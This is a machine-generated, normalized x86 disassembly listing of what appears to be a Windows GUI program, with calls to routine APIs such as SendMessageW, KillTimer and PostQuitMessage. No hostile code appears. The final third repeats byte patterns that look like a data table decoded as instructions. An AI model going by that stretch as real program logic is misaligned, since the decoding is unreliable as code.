test [ esp + 0x24 ] 0x1
setne al
add esp 0x28
retn
sub_49d201
jmp sub_405fd0
sub_49d208
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_49d4e4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_49d4f0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_49d4fc
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_49d508
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_49d514
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_49d520
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_49d540
mov edx [ eax + 0x5c ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_49d55c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4305a0
pop esi
pop ebx
retn
sub_49d570
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_49d578
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4305a0
pop esi
pop ebx
retn
sub_49d58c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_49d670
mov eax [ eax + 0x58 ]
call sub_4303e0
retn
sub_49d67c
xor ecx ecx
mov eax [ eax + 0x58 ]
call sub_4307b0
retn
sub_49d961
jmp sub_405fd0
sub_49d9a5
jmp sub_405fd0
sub_49d9ac
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_49da3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_49d7f8
mov eax esi
mov edx [ ebx + 0x3c ]
call sub_4070a8
pop esi
pop ebx
retn
sub_49daa8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4305a0
pop esi
pop ebx
retn
sub_49dabc
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x8 ]
retn
sub_49db98
push esi
mov esi eax
mov eax [ esi + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_49dba8
push esi
mov esi eax
mov eax [ esi + 0x80 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_49dbb8
push esi
mov esi eax
mov eax [ esi + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_49dbc8
push esi
mov esi eax
mov eax [ esi + 0x88 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_49dbd8
push esi
mov esi eax
mov eax [ esi + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_49dd98
jmp sub_405fd0
sub_49dd9f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49dda8
inc [ eax + 0x90 ]
retn
sub_49ddb0
dec [ eax + 0x90 ]
cmp [ eax + 0x90 ] 0x0
jne r-xdata
retn
test [ eax + 0x92 ] 0x10
je r-xdata
call sub_49ddd0
sub_49ddd0
xor edx edx
call sub_49e24c
retn
sub_49e23e
jmp sub_405fd0
sub_49e2c3
jmp sub_405fd0
sub_49e374
jmp sub_405fd0
sub_49e3a4
add eax 0x34
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
retn
sub_49e3f0
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x89 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x34 ]
xor eax eax
sub_49e441
jmp sub_405d1c
sub_49e446
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4a0994
call sub_406174
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_49e6b0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_49e6e4
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_49e6cc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_49e6e4
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_49e6e4
push 0x0
push edx
push 0x0
push 0x30
call __imp_SystemParametersInfoW_40c578
retn
sub_49e6f4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_49e6e4
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_49e70c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_49e6e4
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_49e7e8
call sub_49e7b0
mov eax [ rw-data ]
mov eax [ eax + 0x5c ]
push eax
mov eax sub_497f08
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_49ee19
jmp sub_405fd0
sub_49ee20
pop ebx
mov esp ebp
pop ebp
retn
sub_49efe4
push ebx
inc [ eax + 0xc4 ]
cmp [ eax + 0xc4 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0x112 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_49f010
push ebx
dec [ eax + 0xc4 ]
cmp [ eax + 0xc4 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x11a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_49f03c
xor edx edx
call sub_49ef3c
retn
sub_49f044
mov dl 0x1
call sub_49ef3c
retn
sub_49f368
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x35 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_49f380
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x35 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_49f398
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x35 ] 0x1
je r-xdata
mov al 0x1
retn
sub_49f3b0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
movzx eax [ eax + 0x35 ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_49f4bb
jmp sub_405fd0
sub_49f4c2
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_49fcda
jmp sub_405d1c
sub_4a0034
mov eax [ eax + 0xa0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4a0080
push esi
mov esi eax
mov eax [ esi + 0x3c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4a0674
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_4a070f
jmp sub_405d1c
sub_4a07cc
jmp sub_405fd0
sub_4a07d3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a08b4
jmp sub_405d1c
sub_4a08ed
jmp sub_405fd0
sub_4a08f4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a08fc
call sub_41856c
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_4a0983
jmp sub_405fd0
sub_4a098a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a0b8f
jmp sub_405fd0
sub_4a0b96
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4a0c8f
jmp sub_405fd0
sub_4a0c96
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a0f2e
jmp sub_405fd0
sub_4a0f35
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a0fb7
jmp sub_405fd0
sub_4a0fbe
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a0fc8
call sub_4a0cb0
retn
sub_4a104e
jmp sub_405fd0
sub_4a1055
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a10bb
jmp sub_405fd0
sub_4a10c2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a1134
cmp edx [ eax + 0x5c ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x5c ] ecx
mov edx [ eax + 0x84 ]
test edx edx
je r-xdata
mov eax ecx
xchg edx eax
call sub_470fdc
sub_4a1154
push 0x0
xor ecx ecx
mov dx 0xb008
call sub_4a13f4
retn
sub_4a1231
jmp sub_405d1c
sub_4a1236
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4a0994
call sub_406174
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4a1364
jmp sub_405d1c
sub_4a13bd
jmp sub_405fd0
sub_4a13c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a1531
jmp sub_405fd0
sub_4a1668
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
cmp [ ebx + 0x4c ] 0x0
setne al
pop ebx
retn
lea eax [ ebx + 0x4c ]
call sub_409cb4
call sub_4416bc
sub_4a16cc
push ebx
mov ebx eax
movzx eax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_4a1a15
jmp sub_405fd0
sub_4a1a44
jmp sub_405fd0
sub_4a1b66
jmp sub_405fd0
sub_4a1b6d
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a1f37
jmp sub_405fd0
sub_4a1f3e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a204c
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ eax + 0xb8 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x170 ]
push eax
call __imp_SendMessageW
retn
sub_4a2214
push ebx
push r-xdata
call GetModuleHandleW
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
sub_4a229c
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_4a22ac
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_4a2d52
jmp sub_405fd0
sub_4a2dee
jmp sub_405fd0
sub_4a2e14
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a2ca8
call sub_4060b0
pop ebx
retn
sub_4a2e30
test eax 0x80000000
je r-xdata
retn
call sub_4a2e14
j_sub_405e48
jmp sub_405e48
sub_4a2f4c
jmp sub_405fd0
sub_4a2f53
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a3205
jmp sub_405fd0
sub_4a320c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4a3214
mov [ esp ] edx
call sub_4a311c
jmp sub_4060b0
sub_4a3221
retn
sub_4a352c
jmp sub_405fd0
sub_4a3533
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3556
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_407df0
retn
sub_4a354f
jmp sub_405fd0
sub_4a3556
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4a3678
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
retn
sub_4a37f1
jmp sub_405fd0
sub_4a37f8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4a3800
push 0x0
xor ecx ecx
call sub_4a372c
retn
sub_4a380c
xor ecx ecx
mov edx 0x20
call sub_404c14
retn
sub_4a3ace
jmp sub_405fd0
sub_4a3ad5
pop ebp
retn
sub_4a3b0d
jmp sub_405d1c
sub_4a3b54
xor eax eax
retn
sub_4a3bad
jmp sub_405d1c
sub_4a3c28
jmp sub_405d1c
sub_4a3c4d
jmp sub_405fd0
sub_4a3c54
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a3d00
jmp sub_405d1c
sub_4a3d25
jmp sub_405fd0
sub_4a3d2c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_405d1c#7
jmp sub_405d1c
j_sub_405d1c#6
jmp sub_405d1c
j_sub_405d1c#5
jmp sub_405d1c
sub_4a3f37
jmp sub_405fd0
sub_4a3f3e
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_405d1c#4
jmp sub_405d1c
sub_4a416d
jmp sub_405fd0
sub_4a417e
jmp sub_405d1c
sub_4a4183
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a41aa
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_4068c4
retn
sub_4a41a3
jmp sub_405fd0
sub_4a41aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a4399
jmp sub_405d1c
sub_4a43e3
jmp sub_405fd0
sub_4a43ea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a449f
jmp sub_405d1c
sub_4a44bf
jmp sub_405fd0
sub_4a44c6
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_405d1c#3
jmp sub_405d1c
sub_4a4627
jmp sub_405fd0
sub_4a462e
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a46f4
jmp sub_405fd0
sub_4a472d
jmp sub_405fd0
sub_4a4734
pop ebx
mov esp ebp
pop ebp
retn
sub_4a4993
jmp sub_405fd0
sub_4a49a4
jmp sub_405d1c
sub_4a49ea
jmp sub_405fd0
sub_4a49f1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a4ad7
jmp sub_405fd0
sub_4a4ade
pop ebx
mov esp ebp
pop ebp
retn
sub_4a4b23
[ eax ]
j_sub_405fd0#9
jmp sub_405fd0
sub_4a4c1a
pop ecx
pop ebp
retn
sub_4a4df8
jmp sub_405fd0
sub_4a4e09
jmp sub_405d1c
j_sub_405fd0#8
jmp sub_405fd0
sub_4a4e42
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_405fd0#7
jmp sub_405fd0
sub_4a4f57
jmp sub_405d1c
sub_4a4f5c
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4f86
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4a4f7f
jmp sub_405fd0
sub_4a4f86
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a5088
jmp sub_405d1c
sub_4a50b0
jmp sub_405fd0
sub_4a50b7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a51c3
jmp sub_405fd0
j_sub_405d1c#2
jmp sub_405d1c
sub_4a5201
jmp sub_405fd0
sub_4a5208
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a521b
[ 0x53000000 ]
sub_4a541b
jmp sub_405fd0
sub_4a5422
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
j_sub_405fd0#6
jmp sub_405fd0
sub_4a54ee
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4a57d7
jmp sub_405d1c
j_sub_405fd0#5
jmp sub_405fd0
sub_4a5803
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a58b9
jmp sub_405d1c
j_sub_405fd0#4
jmp sub_405fd0
sub_4a58e5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a5981
jmp sub_405d1c
sub_4a59a6
jmp sub_405fd0
sub_4a59ad
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a5a57
jmp sub_405fd0
j_sub_405d1c
jmp sub_405d1c
sub_4a5a6d
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5a8f
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
j_sub_405fd0#3
jmp sub_405fd0
sub_4a5a8f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_405d1c#8
jmp sub_405d1c
sub_4a5dbe
call sub_406174
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4a5e50
jmp sub_405d1c
sub_4a5e55
call sub_406174
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4a5e60
retn
sub_4a5ed8
cmp dl cl
dec edx
add ah al
mov al 0x4a
add al ah
mov [ ecx ] es
int3
sub_4a6118
inc esp
stosd [ edi ]
inc ecx
add [ eax + 0x380041b0 ] cl
0x4a
sub_4a6124
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a612c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6134
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6174
test al 0xb9
inc ecx
add [ eax ] bh
0x4a
sub_4a617c
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a6188
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6190
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6198
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61dc
test al 0xac
inc eax
add al al
lodsb [ esi ]
inc eax
add [ eax ] bh
0x4a
sub_4a61e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a61f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6200
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6208
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6210
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6218
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6220
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6228
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6230
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6238
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6240
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6248
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6250
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6258
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6260
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6268
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6270
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6278
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6280
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6288
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6290
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6298
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a62f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6300
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6308
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6310
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6318
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6320
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6328
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6330
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6338
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6340
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6348
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6350
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6358
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6360
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6368
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6370
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6378
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6380
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6388
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6390
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6398
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a63a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a63a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a63b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a63b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a63c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a63c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a63d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a63d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a63e0
cmp dl cl
dec edx
add [ ebp * 4 - 0x52dbffc0 ] al
inc eax
add [ eax - 0x53 ] cl
inc eax
add [ eax ] ch
scasb [ edi ]
inc eax
add [ eax ] bh
0x4a
sub_4a63f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6400
cmp dl cl
dec edx
add ah bl
scasb [ edi ]
inc eax
add [ eax ] bh
0x4a
sub_4a640c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6415
scasb [ edi ]
inc eax
add [ edi + ebp * 4 ] cl
inc eax
add [ eax ] bh
0x4a
sub_4a6420
and al 0xaf
inc eax
add [ eax ] bh
0x4a
sub_4a6428
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6430
cmp [ edi - 0x50afffc0 ] ch
inc eax
add [ eax - 0x51 ] ch
inc eax
add [ eax ] bh
0x4a
sub_4a6440
sub [ edi - 0x5063ffc0 ] 0x40
add [ eax ] bh
0x4a
sub_4a644c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6454
cmp dl cl
dec edx
add [ edi + ebp * 4 - 0x35c7ffc0 ] dh
dec edx
add [ eax ] bh
0x4a
sub_4a6464
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6478
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6480
pushad
mov al 0x40
add [ eax ] bh
0x4a
sub_4a6488
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6490
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6498
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a64f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6500
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6508
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6510
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6518
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6520
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6528
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6530
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6538
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6540
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6548
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6550
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6558
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6560
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6568
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6570
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6578
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6580
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6588
mov ah 0xb0
inc eax
add [ eax ] bh
0x4a
sub_4a6590
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6598
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a65f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6600
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6608
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6610
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6618
fdiv [ ecx - 0x35c7ffc0 ]
dec edx
add [ eax ] bh
0x4a
sub_4a6624
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a662c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6634
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a663c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6644
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a664c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6654
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a665c
cmp dl cl
dec edx
add [ eax + 0x380040b2 ] cl
0x4a
sub_4a6668
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6670
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6678
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6680
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6688
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6690
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6698
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
